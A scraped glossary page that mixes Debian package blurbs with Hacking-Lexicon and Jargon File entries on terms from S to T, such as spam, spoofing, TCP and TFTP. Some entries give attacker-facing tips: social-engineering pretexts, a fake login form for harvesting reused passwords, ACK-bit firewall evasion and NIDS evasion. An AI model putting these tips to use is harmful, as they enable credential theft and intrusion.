>&#13;SMS Server Tools for GSM modems The SMS Server Tools make your server into a central SMS gateway. You can send and receive SM using a simple file-based interface. This Software was made for users who send less than 20 000 messages each month. There is an event-handler option that allows you to call your own programs or scripts after sent or received SM. The SMS Server Tools use one or more (max. 32) GSM modems to send and receive SM. You can equip some modems with Vodafone SIM cards and other with Telmi SIM cards (for example), to save money. All SM are sorted in queues by provider. If one modem fails it will be deactivated for one hour before the software retries. The other modems run without any restriction. You can log status information and alarms using the syslog daemon of your operating system. Upstream URL: http://www.isis.de/members/~s.frings/smstools/ From Debian 3.0r0 APT

>&#13;Show Me The Money is a configurable Perl/Tk stock ticker program smtm, which is a not overly clever acronym for Show Me The Money, is a simple stock ticker application. It creates and automatically updates a window with stock quotes from Yahoo! Finance. When called with one or several stock symbols, it displays these selected stocks, and also records the symbols for later use. When smtm is called without arguments, it reads the symbols tickers from a (default or specified) file. This file can be created explicitly by calling the Save option from the File menu, or implicitly whenever smtm is called with one or more symbols. smtm is fully configurable -- it can display the stock symbol and the full name of the company, the price change, the percentage change, the volume traded, the profit or loss, the value of the holding, the length of the holding period as well as annualised percentage returns. The display can be sort on almost any of the columns.  Losers are flagged in red. smtm can be used for North American equities, as well as European and Australian/NZ ones. It should work for other markets supported by Yahoo! Finance. The quotes are delayed, typically 15 minutes for NASDAQ and 20 minutes otherwise, see Yahoo! Finance for details. From Debian 3.0r0 APT

><P
>&#13;Simple spam-block with refusal message Smtp-refuser can be configured to reject mail from specific hosts (or that satisfy other tcpd hosts.allow or similar rules), returning a meaningful message including the reason it was bounced and a local phone number.  Because spam often has a bad envelope-from, (and because this is more efficient), we bounce it with an error message during the SMTP transaction, rather than send bounce mail later. This SMTP refuser is used along with "tcpd" or (another TCP security daemon) to bounce messages from the IP addresses of known spammers. The advantage of this over just blocking the connection is that the remote SMTP server will not retry, and a legitimate e-mail sender will get a polite message telling them why their mail was blocked and whom to call to get around the blocking. Mail that is not blocked by smtp-refuser is delivered to your standard mail transport agent. Other, more automated solutions such as RBL and ORBS (supported by most of the mail transfer agents), have become available since smtp-refuser was written, but this may still be of interest to you.

>&#13;Mail proxy for firewalls with anti-spam and anti-relay features Smtpd uses two programs, smtpd which listens for incoming mail and places it in a private queue, and smtpfwdd, which invokes sendmail to deliver messages from the queue. The configuration file for smtpd has powerful features for controlling the acceptance of incoming mail. It is particularly useful for firewall sites, where the policy aspects of which mail should be accepted (in smtpd's configuration file) are clearly separated from the routing and other aspects of the mail configuration (which remain in the sendmail configuration file) It can be used with any mail-transport-agent which can be invoked as sendmail but is intended to integrate with the Debian sendmail package, which recognises when smtpd has been installed. If you are attempting to use it with an MTA other than sendmail then you will need to be prepared to modify the MTA configuration. From Debian 3.0r0 APT

>&#13;Social engineering is a form of hacking that targets people's minds rather than their computers. A typical example is sending out snail mail marketing materials with the words "You may already have won" emblazoned across the outside of the letter. As you can see, social engineering is not unique to hackers; it's main practitioners are the marketing departments of corporations. Key point: The classic example is to pretend to be from a company's computer department and call up a user asking for their password. Sophisticated hacks will first try to make the victim uncomfortable (i.e. "We've detected improper use of your account..."), then offer them the opportunity to be very helpful ("I'm sure we can check this out now and not involve your boss."). The technique often works well in reverse: call up the computer support department and tell them you've lost your password. This works especially well in companies that have policies requiring you to change your password -- people forgetting passwords on really old accounts are frequent, so support departments are deluged with such requests, so it's easy to slip one past them. Key point: Know as much about your victim as possible. If you are emulating something, try to find the answers to typical questions you will be asked. Key point: If all else fails, try stupidity. If you are a foreigner, pretend not to speak the language well. Likewise, females have certain advantages in male-dominated cultures. Example: For members-only access, please create an account: Username: Password: Confirm:  People often choose the same password for everything. For example, put in your website the prompt shown to the right. A lot of users will use the same username/password for this that they use for websites like Hotmail, Yahoo mail, or Netscape mail. This will therefore sift valid e-mail accounts from people who visit your site. In a similar manner, these passwords might be useful within the companies they work for as well. Key point: Newbies are favorite victims of social-engineering attacks in chat rooms. Hackers go after people who appear to be unsure of themselves online. Key point: Many hackers do not consider social-engineering a "real" attack because it doesn't require extensive technical knowledge in order to pull off. From Hacking-Lexicon

>&#13;In programming, the "sockets" interface is the most common way that coders use to access the network. Sockets works by creating a "file handle" that when written to, sends data over the network rather than to a file on the hard-disk. Contrast: Other interfaces programmers could use are higher-level abstractions like RPC, or lower-level "raw" interfaces like libnet. Contrast: Sockets originally came from UNIX, but has been ported to other platforms. In particular, the "WinSock" variant for Windows includes both the UNIX-style functions as well as the Windows-style functions. It is possible to write sockets-based programs that compile for both platforms. Key point: The name "sockets" comes from the TCP/IP term "socket". A socket is minimum information necessary needed to communication on the network: the source/destination IP address, the source/destination port, and the transport protocol (UDP or TCP).

>&#13;Most spam comes through open SMTP relays. Spam is generally sent through the SMTP mail transfer protocol, though spammers are increasingly making use of web-based e-mail. A big source of spam comes from people who spider websites looking for web-pages that contain e-mail addresses. Since a lot of a web-sites will archive mailing lists and USENET groups, posting to a "private" list will often still expose your e-mail address. The SirCam worm of 2001 spidered the HTML files on the local web-browser cache to forward e-mail, creating a hugely effective manner for discovering new e-mail addresses. Spammers will usually spoof their e-mail address -- you can virtually never reply to the "sender" e-mail address. Netiquette: Use Bcc to send to multiple recipients rather than Cc: or To: fields in order to avoid exposing friends e-mail addresses to potential spammers. Firewalls don't block spam. The @Home cable modem ISP now regularly scans its customers for open USENET relays that spammers often hijack in order to forward spam on newsgroups. Some people are so emotionally against spam that they will will completely shun all access from networks known to be sources of spam. Websites will sometimes scan clients with SNMP or NetBIOS in order to discover their login name. Likewise, some websites sift HTTP fields for usernames (though virtually all web-browsers have disabled this feature). A Rumpelstiltskin attack is where a spammer sends e-mail to all possible names (a@example.com, b@example.com, c@example.com, ...) at a domain. This is similar to a brute-force attack.

>&#13;vt.,vi.,n. [from "Monty Python's Flying Circus"] 1. To crash a program by overrunning a fixed-size buffer with excessively large input data. See also buffer overflow, overrun screw, smash the stack. 2. To cause a newsgroup to be flooded with irrelevant or inappropriate messages. You can spam a newsgroup with as little as one well- (or ill-) planned message (e.g. asking "What do you think of abortion?" on soc.women). This is often done with cross-posting (e.g. any message which is crossposted to alt.rush-limbaugh and alt.politics.homosexuality will almost inevitably spam both groups). This overlaps with troll behavior; the latter more specific term has become more common. 3. To send many identical or nearly-identical messages separately to a large number of Usenet newsgroups. This is more specifically called `ECP', Excessive Cross-Posting. This is one sure way to infuriate nearly everyone on the Net. See also velveeta and jello. 4. To bombard a newsgroup with multiple copies of a message. This is more specifically called `EMP', Excessive Multi-Posting. 5. To mass-mail unrequested identical or nearly-identical email messages, particularly those containing advertising. Especially used when the mail addresses have been culled from network traffic or databases without the consent of the recipients. Synonyms include UCE, UBE. 6. Any large, annoying, quantity of output. For instance, someone on IRC who walks away from their screen and comes back to find 200 lines of text might say "Oh no, spam". The later definitions have become much more prevalent as the Internet has opened up to non-techies, and to most people senses 3 4 and 5 are now primary. All three behaviors are considered abuse of the net, and are almost universally grounds for termination of the originator's email account or network connection. In these senses the term `spam' has gone mainstream, though without its original sense or folkloric freight - there is apparently a widespread myth among lusers that "spamming" is what happens when you dump cans of Spam into a revolving fan. Hormel, the makers of Spam, have published a surprisingly enlightened position statement on the Internet usage.  From Jargon Dictionary

>&#13;An automated program that reads webpages from a website, then follows the hypertext links to other pages. If the Internet is a "web", then a spider is something that follows the strands of the web. Key point: A website can use the file "robots.txt" to give hints to spiders what they should, or should not, index. A big problem with websites is that spiders are really good at finding webpages, even those that website operators don't care to be exposed. However, users can still find these pages due to hits from search engines. Website operators can therefore "hide" pages by listing them in "robots.txt". However, hackers will therefore read "robots.txt" in order to find webpages that website operators want hidden. Example: Spammers use spiders to sift through web pages looking for e-mail addresses. For example, if you have a link that looks like &#60;A HREF="mailto:spexamp@reckoning.robertgraham.com"&#62;me&#60;/A&#62; then the spam spider will find the address and funnel spam to you. A partial defense against this is to URL-encode your e-mail address, which hides it from most spam spiders, but works in most browsers. See the page at http://www.robertgraham.com/tools/mailtoencoder.html for an example. Contrast: A spider pulls information inward; a worm pushes itself outward to other systems. A spider is a type of 'bot, rather than infectious malware like viruses, trojans, or worm. From Hacking-Lexicon

>&#13;spoof
</B
></DT
><DD
><P
>&#13;The word "spoof" generally means the act of forging your identity. More specifically, it means forging the sender's IP address (IP spoofing). Analogy: When you send a letter via normal post (snail mail), you write the recipient's name and address on the envelope. You typically also write the sender's name and address as well, so that if there is an error forwarding you letter (e.g. a stamp falls off), they know who sent the letter and can return it. However, you can easily spoof it. For example, someone I know absolutely had to send a letter, but had no stamps. So he simply put the actual recipient's name as the return address section of the envelope and dropped it into the mail box. The letter was returned to sender, which of course arrived at the intended recipient. Misunderstanding: Most people are interested in spoofing because they think it will allow them to hack a machine in a completely anonymous manner. It doesn't work this way. For example, Mitnick used IP spoofing in order to attack Shimomura's computers, but was caught anyway because spoofing does not truly hide the attacker. The problem is that all responses go back to the sender, so if you've spoofed the sender, you'll never see the responses. Therefore, the spoofing is useless for any normal activity. On the other hand, spoofing can still be useful in situations where seeing the response is not necessary. In the Mitnick instance, two machines trusted each other. Therefore, Mitnick was able to emulate and entire connection between the two machines by "predicting" what all the responses would be. He used this connection to open up something on the victim machine that he could then connect to normally. It was precursor scanning the and the post-spoof connection that Shimomura used to catch Mitnick. Example: A particularly nasty form of a spoofing is TCP sequence number prediction. Theoretically, you cannot spoof any protocol based upon TCP connections. This is because both sides of a TCP connection choose their own Initial Sequence Number (ISN). In theory, this is a completely random number that cannot be guessed. In practice, it can sometimes be easily guessed. Mitnick used this technique when hacking Shimomura. As of the end of 1999, operating systems such as Linux, WinNT, and Win2k have implemented truly random ISNs in order to defeat this type of attack. Example: In terms of volume of traffic, the most common use of spoofing today is smurf and fraggle attacks. These attacks spoofed packets against amplifiers in order to overload the victim's connection. This is done by sending a single packet to a broadcast address with the victim as the source address. All the machines within the broadcast domain then respond back to the victim, overloading the victim's Internet connection. Since smurfing accounts for more than half the traffic on some backbones, ISPs are starting to take spoofing seriously and have started implementing measures within their routers that verify valid source addresses before passing the packets. As a consequence, spoofing will become increasingly more difficult as time goes on. Key point: Most of the discussion of spoofing centers around clients masquerading as somebody else. On the other hand, the reverse problem is equally worrisome: hackers can often spoof servers. For example, I post on my website that there is a serious security fix needed to protect yourself while on the web, and point you to http://www.micrsoft.com and hope that you never notice that the URL is misspelled. You would then go to that site (which would be really my server) and download the patch, which would really be a Trojan Horse that I designed in order to break into your computer. This is why server-side certificates are important: they allow someone to validate that the server isn't bogus. Key point: As the analogy with postal mail shows, many things can be forged, not just the sender's IP address. Most spammers forge their sender's e-mail address in order to avoid all the hate mail they will receive in response. Forging your own sender e-mail address is as simple as reconfiguring your e-mail client -- anybody can do it. (However, there are more secrets to this, which mean you can still be caught by any determined person). Contrast: Blind spoofing describes when you have no knowledge of the responses. Non-blind spoofing is when you are somewhere "in the line of site" as one end of the connection and can sniff some packets. For example, you may spoof a neighbor on the same cable-modem segment. Non-blind spoofing is also used in sniffers like juggernaut to either kill connections or to hijack them. From Hacking-Lexicon

>&#13;n. The set of things a person has to do in the future. One speaks of the next project to be attacked as having risen to the top of the stack. "I'm afraid I've got real work to do, so this'll have to be pushed way down on my stack." "I haven't done it yet because every time I pop my stack something new gets pushed." If you are interrupted several times in the middle of a conversation, "My stack overflowed" means "I forget what we were talking about." The implication is that more items were pushed onto the stack than could be remembered, so the least recent items were lost. The usual physical example of a stack is to be found in a cafeteria: a pile of plates or trays sitting on a spring in a well, so that when you put one on the top they all sink down, and when you take one off the top the rest spring up a bit. See also push and pop. At MIT, PDL used to be a more common synonym for stack in all these contexts, and this may still be true. Everywhere else stack seems to be the preferred term. Knuth ("The Art of Computer Programming", second edition, vol. 1, p. 236) says: Many people who realized the importance of stacks and queues independently have given other names to these structures: stacks have been called push-down lists, reversion storages, cellars, nesting stores, piles, last-in-first-out ("LIFO") lists, and even yo-yo lists!

For example, you may not not LOAD or EVAL new expressions or procedure definitions at runtime, but in exchange, it is able to perform various global analyses which may allow it to transparently map Scheme types to C types and to use native C arithmetic operations on a per-expression basis, whenever such operations are proven safe. Further stalin can often reduce or eliminate run-time type checking and dispatching, and omit garbage collection for data of limited scope or accessability, while omitting unreachable data altogether. stalin also has a foreign procedure interface to both Xlib and OpenGL.

Stateful inspection is needed to pass classic FTP as well as newer multimedia protocols (NetMeeting, RealAudio, etc.). Example: Class FTP has a separate control connection and data connection. When you connect to an FTP server and request a file, you tell the server to connect back to you. Since most firewalls allow outgoing connections to servers but block incoming connections, you will be able to connect to the FTP server, but you won't be able to retrieve the desired file. Stateful inspection looks at the outgoing connection and notices that you've requested the incoming connection. The firewall opens up a tiny hole allowing just that inbound connection, thus fixing the entire situation. From Hacking-Lexicon

>&#13;Software Upgrade Protocol implementation The SUP System is a set of programs developed by Carnegie Mellon University that provide for collections of files to be maintained in identical versions across a number of machines.  These programs are: SUP: The "client" program, run by users or system maintainers, which initiates the upgrade activity  on  a  machine  requesting  the latest  version of a collection of files.  SUP will normally be run as a daemon, firing up once  each  night  (week,  etc.)  to upgrade the specified file collections. SUPFILESRV: The "file server" program, a daemon that is run by the system maintainer to service requests for files initiated by client SUP programs.  The file server runs on every machine used as a "repository" of distributable versions of files.  It runs continuously and listens for network connection requests by individual client processes; for each individual client request, a process is forked to service that request. SUPSCAN: The "file scanner" program, that may optionally be run periodically to speed up execution of the file server.  It pre-compiles a list of files on the file system that match the specifications for a given file collection so that the file server need not do this during each upgrade of that collection.  The file scanner is normally used daily for very large file collections that are upgraded by many clients each day; it is not so useful for small file collections or for those that are upgraded by only a few client machines per day.

><P
>&#13;An important aspect of all operating systems is a feature called "virtual memory". This allows the OS to take unused pieces of memory and write them to disk, then free up the block of memory just written so that another active application can use it. Whenever somebody needs that block again, the operating system will automatically restore it from the disk. Of course, it will then have to free up another block to do so by writing that block to the disk. This technique is generally called "swapping" or "paging". The word "swap" reflects the fact that inactive blocks of memory are being switched with active blocks from the disk. The word "paging" reflects the fact that a common name for a block of memory is "page". The name of the file on the disk that an OS uses for swapping is called the "swapfile" or "pagefile". Key point: A lot of security depends upon the fact that memory is secure: the OS protects applications from reading other application's memory, and that when the computer is turned off, the memory is erased. Therefore, applications can safely store passwords in clear-text in memory. Swapping defeats this, because the memory pages that store the passwords may have been swapped to the disk. Someone with physical access to the machine can turn it off, steal the disk, and run the pagefile through analysis programs in order possibly retrieve passwords. From Hacking-Lexicon

>&#13;vt. 1. [techspeak] To move information from a fast-access memory to a slow-access memory (`swap out'), or vice versa (`swap in'). Often refers specifically to the use of disks as `virtual memory'. As pieces of data or program are needed, they are swapped into core for processing; when they are no longer needed they may be swapped out again. 2. The jargon use of these terms analogizes people's short-term memories with core. Cramming for an exam might be spoken of as swapping in. If you temporarily forget someone's name, but then remember it, your excuse is that it was swapped out. To `keep something swapped in' means to keep it fresh in your memory: "I reread the TECO manual every few months to keep it swapped in." If someone interrupts you just as you got a good idea, you might say "Wait a moment while I swap this out", implying that a piece of paper is your extra-somatic memory and that if you don't swap the idea out by writing it down it will get overwritten and lost as you talk.

This is more convenient than using fixed swap files and/or partitions because they (a) are unused most of the time and are just taking up disk space; and (b) provide a limited amount of virtual memory. On systems that have constant need for virtual memory it would still be wise to use a swap partition in parallel with dynamic swapping, since swap partitions provide much faster access than swap files.

Other actions include sending mail or executing an arbitrary program on the line. Swatch is written in Perl and uses Perl regular expressions for line matching.

</B

>&#13;On UNIX, a symbolic link is where a file in one directory acts as a pointer to a file in another directory. For example, you could create a link so that all accesses to the file /tmp/foo really act upon the file /etc/passwd. This feature can often be exploited. While a non-root user does not have permission to write to administrative files like /etc/passwd, they can certainly create links to them in the /tmp directory or their local directory. SUID can then be exploited whereby they believe they are acting upon a user file, which which are instead acting upon the original administrative file. This is the leading way that local users can escalate their privileges on a system. Example: finger A user could link their .plan file to any other file on the system. A finger daemon running with root privileges would then follow the link to that file and read it upon execution of a finger lookup. From Hacking-Lexicon

>&#13;/T/ 1. [from LISP terminology for `true'] Yes. Used in reply to a question (particularly one asked using The -P convention). In LISP, the constant T means `true', among other things. Some Lisp hackers use `T' and `NIL' instead of `Yes' and `No' almost reflexively. This sometimes causes misunderstandings. When a waiter or flight attendant asks whether a hacker wants coffee, he may absently respond `T', meaning that he wants coffee; but of course he will be brought a cup of tea instead. Fortunately, most hackers (particularly those who frequent Chinese restaurants) like tea at least as well as coffee -- so it is not that big a problem. 2. See time T (also since time T equals minus infinity). 3. [techspeak] In transaction-processing circles, an abbreviation for the noun `transaction'. 4. [Purdue] Alternate spelling of tee. 5.

>&#13;Transmission Control Protocol. The chief transport protocol for TCP/IP. Key point: TCP is "connection oriented". This means the three-way handshake must be completed before any data can be sent across the connection. This makes IP address spoofing impossible without sequence number prediction. Key point: TCP creates a virtual "byte stream" for applications. Therefore, applications that send/receive data must create their own boundaries, such as length encoding the data, or send text data a line at a time. However, in practice, applications do indeed send data aligned on packet boundaries. Most network-based intrusion detection systems depend upon these boundaries in order to work correctly. Therefore, they can easily be evaded by custom written scripts that misalign the data. The applications don't see any difference, but the NIDS see something completely different go across the wire that no longer matches their signatures. Contrast: There are two transport protocols: TCP and UDP. Whereas TCP is connection-oriented, UDP is connectionless, meaning UDP-based applications are easily spoofed.

Acknowledgement Number^ The next expected sequence number of packets coming in the opposite direction. Reserved^ Not used. Note that this "field" is actually two fields: the low-order bits of the data offset byte and the high-order bits of the flags byte. Key point: The two undefined flags in this field are handled differently by different systems, which allows them to be fingerprinted URG^ The urgent flag is used to send what is known as out-of-band data. Key point: TCP/IP stacks often don't implement this right, and virtually no application uses it either. In fact, the WinNuke DoS attack against Windows was due to the fact that Windows would crash on URG data. ACK^ When set, the Acknowledgement Number field is valid. Key point: This bit is set in every packet but the first one, because every TCP packet acknowledges the last data it received. Key point: In order to block incoming connections, firewalls typically only pay attention to TCP packets with the ACK bit == 0. In other words, by blocking the first packet of a TCP connection, you prevent the connection from being established in the first place. Key point: Hackers can usually send TCP packets through a firewall by setting the ACK bit. Even though hackers cannot connect to a service, they can still do things like port scanning using this technique. PSH^ Normally, TCP tries to coalesce multiple packets into a single packet in order to improve throughput performance (handling one big chunk is more efficient than smaller chunks), but at the cost of latency (after receiving the first chunk, it must wait a little bit to see if a second chunk arrives). This bit tells the stack to push the data though immediately without waiting. RST^ Informs the other side that an error has occurred. This will either drop the connection or set it back to a known state. Key point: Different TCP/IP stacks send resets in response to different conditions, which can be used to fingerprint the stack. SYN^ Begins a connection. The most important consideration is synchronizing the sequence numbers on both sides. See SYN for more information. FIN^ Closes a connection. Key point: If you send a FIN packet to an open port, it should not respond. Some incorrectly written stacks respond anyway, allowing you to fingerprint a system. Key point: IDS systems monitoring network traffic will sometimes kill TCP sessions by spoofing a FIN packet. Thus, when it detects an intruder connected to a server, it will make the server think the intruder has hung-up, and the server will likewise hang-up.  From Hacking-Lexicon

>&#13;When trying to spoof a TCP connection, the intruder is faced with the difficulty that he will never see the response to a SYN packet.. This is a problem because the victim sends back information to the spoofed address that is needed to carry on the conversation, namely the sequence number being used by the victim. Luckily (for hackers), most systems choose sequence numbers in a predictable way. History: Kevin Mitnick was caught doing TCP sequence number prediction against Tsutmu Shimomura. The reason Shimomura was able to catch Mitnick is because in order to predict the next sequence number, you must first grab the previous number using a non-spoofed connection. History: One of the first to point out this security problem was Robert T. Morris in a 1985 paper entitled A Weakness in the 4.2BSD Unix TCP/IP Software. From Hacking-Lexicon

Contrast: TCSEC is designed around the concept of trusted employees accessing local systems. It was not designed for todays open Internet access.

>&#13;Trivial File Transfer Protocol TFTP is a bare-bones protocol used by devices that boot from the network. It is runs on top of UDP, so it doesn't require a real TCP/IP stack. Misunderstanding: Many people describe TFTP as simply a trivial version of FTP. This misses the point. The purpose of TFTP is not to reduce the complexity of file transfer, but to reduce the complexity of the underlying TCP/IP stack so that it can fit inside boot ROMs. Key point: TFTP is almost always used with BOOTP. BOOTP first configures the device, then TFTP transfers the boot image named by BOOTP. Key point: Many systems come with unnecessary TFTP servers. Many TFTP servers have bugs, like the backtracking problem or buffer overflows. As a consequence, many systems can be exploited with TFTP even though virtually nobody really uses it. Key point: A TFTP file transfer client is built into many operating systems (UNIX, Windows, etc.). These clients are often used to download rootkits when being broken into. Therefore, removing the TFTP client should be part of your hardening procedure. From Hacking-Lexicon

>&#13;/tekh/ n. An extremely powerful macro-based text formatter written by Donald E. Knuth, very popular in the computer-science community (it is good enough to have displaced Unix troff, the other favored formatter, even at many Unix installations). TeX fans insist on the correct (guttural) pronunciation, and the correct spelling (all caps, squished together, with the E depressed below the baseline; the mixed-case `TeX' is considered an acceptable kluge on ASCII-only devices). Fans like to proliferate names from the word `TeX' -- such as TeXnician (TeX user), TeXhacker (TeX programmer), TeXmaster (competent TeX programmer), TeXhax, and TeXnique. See also CrApTeX. Knuth began TeX because he had become annoyed at the declining quality of the typesetting in volumes I-III of his monumental "Art of Computer Programming" (see Knuth, also bible). In a manifestation of the typical hackish urge to solve the problem at hand once and for all, he began to design his own typesetting language. He thought he would finish it on his sabbatical in 1978; he was wrong by only about 8 years. The language was finally frozen around 1985, but volume IV of "The Art of Computer Programming" is not expected to appear until 2002. The impact and influence of TeX's design has been such that nobody minds this very much. Many grand hackish projects have started as a bit of toolsmithing on the way to something else; Knuth's diversion was simply on a grander scale than most. TeX has also been a noteworthy example of free, shared, but high-quality software. Knuth offers a monetary awards to anyone who found and reported bugs dating from before the 1989 code freeze; as the years wore on and the few remaining bugs were fixed (and new ones even harder to find), the bribe went up. Though well-written, TeX is so large (and so full of cutting edge technique) that it is said to have unearthed at least one bug in every Pascal system it has been compiled with.

Telnet establishes a "plain vanilla" computer terminal called a network virtual terminal. This capability is frequently used to enable communications with bulletin boards systems (BBSs) and mainframe computers. For example, you will often see hyperlinks so Telnet sessions while browsing the World Wide Web (WWW) . If you click such a hyperlink, your browser starts a Telnet helper program, and you see a text-only command window. In this window, you type commands and see the remote system's responses.

>&#13;Triple DES (3DES, 3DES_EDE)
</B
></DT
><DD
><P
>&#13;A stronger form of DES where the algorithm is applied three times in order to encrypt data. Triple DES became necessary in the later part of the 20th century because DES had become so weak (a $200k machine was able to decrypt a DES encrypted message in hours). At that time, the new AES replacement had not yet appeared. In order to leverage DES hardware/software products, it was decided just to use DES three times with multiple keys. Point: Triple DES runs in "E-D-E" mode where it encrypts the data with the first key, then decrypts it with the second key, then encrypts with the third key. The second "decryption" phase is really just an encryption step: it is only by convention that one direction is considered encryption and the other direction decryption. The reason this technique is chosen is that if the same key is supplied three times, the effect is the same as a single encryption step. Controversy: The NSA urged banks not to adopt Triple-DES as a standard, citing national security concerns. They instead urged banks to adopt the Clipper chip. The banks went with Triple-DES in ANSI X9.52. In fact, as of 1998, several countries mandated the use of Triple-DES (replacing DES) in financial transactions. Controversy: Simply tripling the encryption does not necessarily triple its strength. For example, there are many crypto algorithms whereby encrypting with two different keys simply means you can decrypt with a single third key. Many suspect that tripling DES only doubles is cryptographic strength. From Hacking-Lexicon

>&#13;Tux the Penguin is the official emblem of Linux, This eventuated after a logo contest in 1996, during which Linus Torvalds endorsed the idea of a penguin logo in a couple of famously funny postings. Linus explained that he was once bitten by a killer penguin in Australia and has felt a special affinity for the species ever since. (Linus has since admitted that he was also thinking of Feathers McGraw, the evil-genius penguin jewel thief who appeared in a Wallace &#38; Grommit feature cartoon, "The Wrong Trousers".) Larry Ewing designed the official Tux logo. It has proved a wise choice, amenable to hundreds of recognizable variations used as emblems of Linux-related projects, products, and user groups. In fact, Tux has spawned an entire mythology, of which the Gospel According to Tux and the mock-epic poem "Tuxowolf" are among the best-known examples. There is a `real' Tux - a black-footed penguin resident at the Bristol Zoo. Several friends of Linux bought a zoo sponsorship for Linus as a birthday present in 1996.  From Jargon Dictionary

Together, they allow you to convert between PFA (ASCII) and PFB (binary) formats; disassemble PFA or PFB files into human-readable form; and reassemble the human-readable files into PFA or PFB format files.  You can also  extract font resources from a Macintosh font file (ATM/Laserwriter), or create a Macintosh Type 1 font file from a PFA or PFB font. There are currently six programs:  t1ascii   Converts PFB files to PFA format.  t1binary  Converts PFA files to PFB format.  t1disasm  Disassembles a Type 1 font (PFA or PFB format) into a raw,            human-readable text form for subsequent hand editing,            tweaking, hint fixing, etcetera...  t1asm     Assembles a Type 1 font into PFA or PFB format from            the human-readable form produced by t1disasm.  t1unmac   Extracts POST resources from a Macintosh Type 1 font file            (ATM/Laserwriter) into PFA or PFB format for use outside            the Macintosh environment.  The Macintosh file should be            stored in MacBinary, AppleSingle, AppleDouble, or BinHex            format, or as a raw resource fork.  Note that t1unmac does            not have to run on a Macintosh, but makes Macintosh Type 1            fonts available for use on Unix machines and PCs.  t1mac     Creates a Macintosh Type 1 file from a PFA- or PFB-format            Type 1 font. Writes the Macintosh file in MacBinary,            AppleSingle, AppleDouble, or BinHex format, or as a raw            resource fork.  WARNING: This tool will not suffice to            allow you to use the new font on a Macintosh, as            Macintoshes cannot read raw Type 1 fonts.  You will need            to create a font suitcase containing bitmap fonts.  If you            do not already have such a suitcase for the font, T1utils            will not help you create one. This version of the t1utils programs has been maintained by Eddie Kohler &#60;eddietwo@lcs.mit.edu&#62; since version 1.5, based on the original code by I. Lee Hetherington.

>&#13;A common vulnerability that hackers use to break into systems is the lack of proper input validation. The problem is that programmers expect users to enter in "proper" input, but fail to check for the case of hostile users carefully crafting input designed to compromise the system. The problems with input validation is that the part of the system that receives the input does not know enough to validate it properly. On the other hand, every single component in the system cannot thoroughly validate input. The concept of "taint" is to mark certain inputs as having been entered by the user. Only a thorough desconstruction/reconstruction of the data removes the taint. Some programming languages, like PERL, automate this tracking. Others, like C, requires manual tracking. Example: Version 4 of PERL has a special alternative interpretter called tainperl that tracks tainted input. Version 5 of PERL has the option "-T" that tracks taint.

>&#13;talk mode
</B

><DD
><P
>&#13;n. A feature supported by Unix, ITS, and some other OSes that allows two or more logged-in users to set up a real-time on-line conversation. It combines the immediacy of talking with all the precision (and verbosity) that written language entails. It is difficult to communicate inflection, though conventions have arisen for some of these (see the section on writing style in the Prependices for details). Talk mode has a special set of jargon words, used to save typing, which are not used orally. Some of these are identical to (and probably derived from) Morse-code jargon used by ham-radio amateurs since the 1920s. AFAIAC as far as I am concerned AFAIK as far as I know BCNU be seeing you BTW by the way BYE? are you ready to unlink? (this is the standard way to end a talk-mode conversation; the other person types BYE to confirm, or else continues the conversation) CUL see you later ENQ? are you busy? (expects ACK or NAK in return) FOO? are you there? (often used on unexpected links, meaning also "Sorry if I butted in ..." (linker) or "What's up?" (linkee)) FWIW for what it's worth FYI for your information FYA for your amusement GA go ahead (used when two people have tried to type simultaneously; this cedes the right to type to the other) GRMBL grumble (expresses disquiet or disagreement) HELLOP hello? (an instance of the `-P' convention) IIRC if I recall correctly JAM just a minute (equivalent to SEC....) MIN same as JAM NIL no (see NIL) NP no problem O over to you OO over and out / another form of "over to you" (from x/y as "x over y") \ lambda (used in discussing LISPy things) OBTW oh, by the way OTOH on the other hand R U THERE? are you there? SEC wait a second (sometimes written SEC...) SYN Are you busy? (expects ACK, SYN|ACK, or RST in return; this is modeled on the TCP/IP handshake sequence) T yes (see the main entry for T) TNX thanks TNX 1.0E6 thanks a million (humorous) TNXE6 another form of "thanks a million" WRT with regard to, or with respect to. WTF the universal interrogative particle; WTF knows what it means? WTH what the hell? &#60;double newline&#62; When the typing party has finished, he/she types two newlines to signal that he/she is done; this leaves a blank line between `speeches' in the conversation, making it easier to reread the preceding text. &#60;name&#62;: When three or more terminals are linked, it is conventional for each typist to prepend his/her login name or handle and a colon (or a hyphen) to each line to indicate who is typing (some conferencing facilities do this automatically). The login name is often shortened to a unique prefix (possibly a single letter) during a very long conversation. /\/\/\ A giggle or chuckle. On a MUD, this usually means `earthquake fault'. Most of the above sub-jargon is used at both Stanford and MIT. Several of these expressions are also common in email, esp. FYI, FYA, BTW, BCNU, WTF, and CUL. A few other abbreviations have been reported from commercial networks, such as GEnie and CompuServe, where on-line `live' chat including more than two people is common and usually involves a more `social' context, notably the following: &#60;g&#62; grin &#60;gd&#38;r&#62; grinning, ducking, and running BBL be back later BRB be right back HHOJ ha ha only joking HHOK ha ha only kidding HHOS ha ha only serious IMHO in my humble opinion (see IMHO) LOL laughing out loud NHOH Never Heard of Him/Her (often used in initgame) ROTF rolling on the floor ROTFL rolling on the floor laughing AFK away from keyboard b4 before CU l8tr see you later MORF male or female? TTFN ta-ta for now TTYL talk to you later OIC oh, I see rehi hello again Most of these are not used at universities or in the Unix world, though ROTF and TTFN have gained some currency there and IMHO is common; conversely, most of the people who know these are unfamiliar with FOO?, BCNU, HELLOP, NIL, and T. The MUD community uses a mixture of Usenet/Internet emoticons, a few of the more natural of the old-style talk-mode abbrevs, and some of the `social' list above; specifically, MUD respondents report use of BBL, BRB, LOL, b4, BTW, WTF, TTFN, and WTH. The use of `rehi' is also common; in fact, mudders are fond of re- compounds and will frequently `rehug' or `rebonk' (see bonk/oif) people. The word `re' by itself is taken as `regreet'. In general, though, MUDders express a preference for typing things out in full rather than using abbreviations; this may be due to the relative youth of the MUD cultures, which tend to include many touch typists and to assume high-speed links. The following uses specific to MUDs are reported: CU l8er see you later (mutant of CU l8tr) FOAD fuck off and die (use of this is generally OTT) OTT over the top (excessive, uncalled for) ppl abbrev for "people" THX thanks (mutant of TNX; clearly this comes in batches of 1138 (the Lucasian K)). UOK? are you OK? Some B1FFisms (notably the variant spelling d00d) appear to be passing into wider use among some subgroups of MUDders. One final note on talk mode style: neophytes, when in talk mode, often seem to think they must produce letter-perfect prose because they are typing rather than speaking. This is not the best approach. It can be very frustrating to wait while your partner pauses to think of a word, or repeatedly makes the same spelling error and backs up to fix it. It is usually best just to leave typographical errors behind and plunge forward, unless severe confusion may result; in that case it is often fastest just to type "xxx" and start over from before the mistake.

